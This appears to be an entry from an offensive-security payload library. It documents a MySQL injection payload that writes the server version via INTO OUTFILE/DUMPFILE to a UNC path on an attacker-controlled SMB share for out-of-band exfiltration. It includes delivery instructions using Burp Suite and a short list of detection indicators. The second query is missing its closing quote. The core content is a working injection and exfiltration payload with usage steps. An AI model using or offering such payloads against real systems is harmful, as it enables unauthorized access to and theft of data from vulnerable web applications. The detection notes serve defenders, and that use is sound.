---
id: fc185d24-81b3-4c1c-b9d6-517e1b0ef7e7
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:35.007624+00:00'
updated_at: '2023-04-10T20:22:48.324121+00:00'
tags:
  - mysql-injection
  - oob-exfiltration
platforms:
  - Database
  - MySQL
validated: true
---

# MySQL-Version-Exfiltration-to-Remote-File

## Code

```sql
select @@version into outfile '\\192.168.0.100\temp\out.txt';
select @@version into dumpfile '\\192.168.0.100\temp\out.txt
```

## Description

This SQL code snippet retrieves the MySQL server version using @@version and exports it to a remote file via UNC path using INTO OUTFILE and INTO DUMPFILE. It is designed for injection into vulnerable web applications to perform out-of-band data exfiltration over SMB, allowing attackers to retrieve database information without relying on the application's response channel.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| \\192.168.0.100\temp\out.txt | UNC path to attacker-controlled SMB share and filename | \\attacker-ip\share\data.txt |

## Usage

Inject this code into a SQL injection vulnerability in a web parameter (e.g., via POST request or URL). Ensure the MySQL server can resolve and write to the UNC path. Use tools like Burp Suite to deliver the payload. After injection, check the remote share for the output file. This is typically used in reconnaissance phases to identify MySQL versions for targeted exploits.

## Detection

- MySQL audit logs showing SELECT @@version with INTO OUTFILE/DUMPFILE.
- Network monitoring for SMB connections (port 445) from database servers to external IPs.
- File system logs on the database server for attempted UNC writes.
- WAF alerts for SQL injection patterns involving file export clauses.

## Related

- [[procedures/MySQL-Injection-Out-of-Band-Data-Exfiltration]]
